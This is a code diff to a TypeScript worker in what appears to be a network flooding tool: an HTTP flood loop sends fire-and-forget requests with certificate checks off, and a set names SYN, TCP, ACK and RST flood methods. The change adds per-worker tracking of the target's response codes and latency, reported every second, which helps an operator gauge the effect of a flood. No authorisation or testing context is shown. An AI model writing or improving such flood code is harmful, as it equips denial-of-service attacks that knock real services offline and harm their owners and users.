@@ -1032,14 +1032,16 @@ async function runHTTPFlood(
       ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
     };
 
+    const t0req = Date.now();
     const req = (isHttps ? https : http).request(reqOpts, (res) => {
       inflight--;
       localPkts++;
       localBytes += (bodyBuf?.length ?? 0) + (parseInt(String(res.headers["content-length"] || "0")) || 400) + 200;
+      workerTrackCode(res.statusCode ?? 0, Date.now() - t0req);
       res.destroy(); // fire-and-forget: don't read body, release socket NOW
     });
 
-    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; });
+    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; workerTrackCode(0); });
     req.on("timeout", () => { req.destroy(); });
 
     if (bodyBuf) req.write(bodyBuf);
@@ -4761,6 +4763,33 @@ try {
 
 const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
 const onStats = (p: number, b: number, c = 0) => { parentPort?.postMessage({ pkts: p, bytes: b, conns: c }); };
+
+// ── Response code + latency accumulator (T003 real-time telemetry) ─────────
+// All HTTP methods call workerTrackCode(statusCode, latencyMs) to report results.
+// A separate 1s interval flushes to parent so codes don't mix with packet stats.
+const workerCodes = { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
+const workerLat   = { sum: 0, count: 0 };
+
+function workerTrackCode(status: number, latMs?: number): void {
+  if      (status >= 200 && status < 300) workerCodes.ok++;
+  else if (status >= 300 && status < 400) workerCodes.redir++;
+  else if (status >= 400 && status < 500) workerCodes.client++;
+  else if (status >= 500)                 workerCodes.server++;
+  else                                    workerCodes.timeout++;
+  if (latMs !== undefined && latMs >= 0)  { workerLat.sum += latMs; workerLat.count++; }
+}
+
+setInterval(() => {
+  const total = workerCodes.ok + workerCodes.redir + workerCodes.client + workerCodes.server + workerCodes.timeout;
+  if (total === 0 && workerLat.count === 0) return;
+  const snap = { ...workerCodes };
+  const latAvgMs = workerLat.count > 0 ? Math.round(workerLat.sum / workerLat.count) : 0;
+  // Reset accumulators for next window
+  workerCodes.ok = 0; workerCodes.redir = 0; workerCodes.client = 0;
+  workerCodes.server = 0; workerCodes.timeout = 0;
+  workerLat.sum = 0; workerLat.count = 0;
+  parentPort?.postMessage({ codes: snap, latAvgMs });
+}, 1000).unref();
 
 // ── Worker entry — handle all errors gracefully ────────────────────────
 const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
